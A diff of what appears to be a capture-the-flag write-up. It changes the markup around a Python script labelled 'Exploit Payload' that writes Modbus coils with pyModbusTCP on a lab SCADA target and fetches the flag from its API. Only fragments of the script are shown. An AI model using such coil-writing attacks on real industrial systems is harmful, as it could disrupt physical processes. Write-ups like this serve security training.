@@ -146,8 +146,8 @@ As this process was little bit tedious with `metasploit`, `pyModbusTCP` client c
 Also, we had to perform trial and error for a while to change  `data address base index` for each units inorder to write successfully to the coils.
 
 Here is the final script that we wrote to get the flag:
-  
-```python
+
+{{< code language="python" title="Exploit Payload" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
 from pyModbusTCP.client import ModbusClient
 import requests
 import json
@@ -187,7 +187,7 @@ c.write_multiple_coils(886,[False, False, True, False, False, True, False, False
 print(f"[+] pwn completed, Here's a gift for you!!")
 
 print(json.loads(requests.get('http://10.129.96.95/api').text)['flag'])
-```
+{{< /code>}}
 
   
 ![15](/scada_flag.gif)
